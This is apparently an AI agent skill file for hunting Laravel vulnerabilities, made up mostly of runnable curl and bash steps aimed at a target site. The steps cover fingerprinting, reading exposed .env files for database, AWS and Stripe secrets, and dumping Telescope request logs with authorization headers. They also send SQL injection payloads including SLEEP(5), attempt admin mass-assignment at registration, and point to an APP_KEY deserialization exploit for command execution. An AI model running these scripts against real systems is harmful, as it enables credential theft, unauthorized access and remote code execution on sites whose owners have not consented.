---
name: k1nzr3c0n-hunt-laravel
description: "Hunt Laravel-specific vulnerabilities. Debug mode (APP_DEBUG=true exposes .env, SQL, stack traces), Telescope/Horizon exposed dashboards, .env file at predictable paths, mass assignment (fill/create without $guarded), Laravel-specific SQLi patterns, queue/job deserialization."
tags: [laravel, php, debug, telescope, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Laravel Specific

> **Crown jewel**: APP_DEBUG=true + stack trace = .env leak = DB creds + APP_KEY (deserialization RCE).
> **Telescope**: often deployed without auth in staging that faces internet.

---

## Phase 0 — Fingerprint Laravel

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_laravel_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"

echo "=== Laravel Fingerprinting ==="
# Laravel session cookie name
curl -sI "https://${TARGET}/" | grep -i 'laravel_session\|XSRF-TOKEN\|set-cookie' | sed 's/^/  /'

# Trigger 500 to get framework info
curl -sk "https://${TARGET}/api/nonexistent-endpoint" | \
  grep -i 'laravel\|illuminate\|APP_ENV\|vendor/laravel' | head -3 | sed 's/^/  /'

# Laravel error page
curl -sk "https://${TARGET}/nonexistent-path-xyz" | \
  grep -i 'Whoops!\|laravel\|Illuminate\\\\' | head -2 | sed 's/^/  /'
```

## Phase 1 — Debug Mode and .env Exposure

```bash
echo "=== Debug Mode + .env Leakage ==="
BASE="https://${TARGET}"

# Check debug mode (Whoops! error page = debug mode)
RESP=$(curl -sk "${BASE}/api/test?id='" )
echo "$RESP" | grep -i "Whoops\|APP_KEY\|APP_ENV\|DB_PASSWORD\|Stack trace" | head -5 | sed 's/^/  [DEBUG-MODE] /'

echo ""
echo "=== .env File Discovery ==="
for ENV_PATH in /.env /.env.bak /.env.example /.env.local /.env.production /.env.staging \
  /.env.old /.env.backup /.env_bak /config/.env /application/.env; do
  CODE=$(curl -sk -o /tmp/env_check -w "%{http_code}" "${BASE}${ENV_PATH}")
  if [ "$CODE" = "200" ] && grep -qi "APP_KEY\|DB_PASSWORD\|APP_ENV" /tmp/env_check; then
    echo "  [CRITICAL] ${ENV_PATH}"
    grep -iE "APP_KEY|DB_PASSWORD|DB_HOST|MAIL_PASSWORD|AWS_SECRET|REDIS_PASSWORD|STRIPE" \
      /tmp/env_check | sed 's/^/    /'
  fi
done
```

## Phase 2 — Telescope and Horizon

```bash
echo "=== Laravel Telescope (Debug Dashboard) ==="
BASE="https://${TARGET}"

for TELE_PATH in /telescope /telescope/requests /telescope/api/entries \
  /api/telescope /admin/telescope /debug/telescope; do
  CODE=$(curl -sk -o /tmp/tele_check -w "%{http_code}" "${BASE}${TELE_PATH}")
  if [ "$CODE" = "200" ]; then
    echo "  [EXPOSED] ${TELE_PATH}"
    grep -i 'request\|query\|exception\|email\|password\|secret' /tmp/tele_check | \
      head -5 | sed 's/^/    /'
  fi
done

echo ""
echo "Telescope API dump (if accessible):"
curl -sk "${BASE}/telescope/api/entries?type=requests&per_page=50" 2>/dev/null | \
  python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  for e in d.get('entries',{}).get('data',[])[0:5]:
    print('  Path:', e.get('content',{}).get('uri',''))
    headers = e.get('content',{}).get('headers',{})
    if 'authorization' in headers:
      print('  Auth:', headers.get('authorization',''))
except: pass
" 2>/dev/null

echo ""
echo "=== Laravel Horizon (Queue Dashboard) ==="
for HORIZ in /horizon /horizon/dashboard /api/horizon/stats; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "${BASE}${HORIZ}")
  [ "$CODE" = "200" ] && echo "  [EXPOSED] ${HORIZ} — Horizon queue dashboard accessible"
done
```

## Phase 3 — APP_KEY Recovery → Deserialization

```bash
echo "=== APP_KEY Recovery + Deserialization ==="
echo ""
echo "If APP_KEY found (in .env or debug output):"
echo "  base64url format: base64:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=="
echo ""
echo "  Use: https://github.com/opsxcq/exploit-CVE-2018-15133"
echo "  php artisan exploit --key=BASE64_KEY --method=system --command=id"
echo ""
echo "  Or: Laravel PHAR deserialization — forge encrypted cookie with malicious object"
echo "  With APP_KEY: can encrypt any payload using AES-256-CBC"
echo "  Laravel cookie = encrypted + HMAC'd with APP_KEY → forge with ysoserial PHP gadget"
echo ""
echo "APP_KEY sources (check in order):"
echo "  1. /.env file"
echo "  2. Whoops debug page (shows full .env)"
echo "  3. /storage/logs/laravel.log (sometimes logged)"
echo "  4. Git repo (leak via /.git exposure)"
```

## Phase 4 — Laravel-specific SQLi Patterns

```bash
echo "=== Laravel SQLi Patterns ==="
BASE="https://${TARGET}"

echo "Laravel uses Eloquent ORM — these patterns often miss validation:"
echo ""

# LIKE injection in search
echo "1. LIKE injection:"
curl -sk "${BASE}/api/search?q=%25\\'%20OR%20\\'1\\'=\\'1" | \
  grep -iv "error\|invalid\|sql" | head -2 | sed 's/^/  [LIKE-INJECT] /'

# orderBy injection
echo "2. orderBy injection (often not parameterized):"
curl -sk "${BASE}/api/users?sort=name;SELECT%20SLEEP(5)--" -m 8 | \
  grep -c . | xargs echo "  Response lines:"

# JSON column injection
echo "3. JSON column arrow operator injection:"
curl -sk "${BASE}/api/users?filter[name->>'$.key']=test'%20OR%20'1'='1" | head -3 | sed 's/^/  [JSON-COL] /'

echo ""
echo "Laravel debug stack trace reveals query structure on SQLi:"
echo "  'Syntax error or access violation' → confirms SQL injection point"
```

## Phase 5 — Mass Assignment

```bash
echo "=== Mass Assignment ==="
BASE="https://${TARGET}"

echo "Test: add admin/privileged fields to registration/update body"
echo ""

# Registration with is_admin field
curl -sk -X POST "${BASE}/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"testuser","email":"test_mass@example.com","password":"Test1234!","is_admin":true,"role":"admin","verified":true,"email_verified_at":"2024-01-01"}' | \
  grep -i 'admin\|role\|verified\|created\|user' | head -3 | sed 's/^/  [MASS-ASSIGN] /'

echo ""
echo "After registration, check if privilege was applied:"
echo "  GET /api/me → check if role=admin or is_admin=true in response"
```

## Gate 0

```bash
echo "=== Laravel Gate 0 ==="
echo "  □ Debug mode: Whoops! page exposes DB creds or stack trace with secrets"
echo "  □ .env file: APP_KEY and DB_PASSWORD readable directly"
echo "  □ Telescope: request/query logs accessible without auth"
echo "  □ APP_KEY deserialization: OS command execution confirmed"
echo "  □ Mass assignment: is_admin=true accepted and stored"
echo "  □ SQLi: SLEEP(5) confirmed blind SQL or query error with injection point"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Laravel .env exposed at [target.com/.env]: APP_KEY=base64:xxx, DB_PASSWORD=prod_password, AWS_SECRET_ACCESS_KEY=xxx — Critical credential dump
Laravel Telescope exposed at [/telescope]: unauthenticated access to full request/response log including authorization headers and DB queries
APP_DEBUG=true on [target.com]: Whoops! error page reveals full .env contents including database and API keys on any 500 error — Critical
```
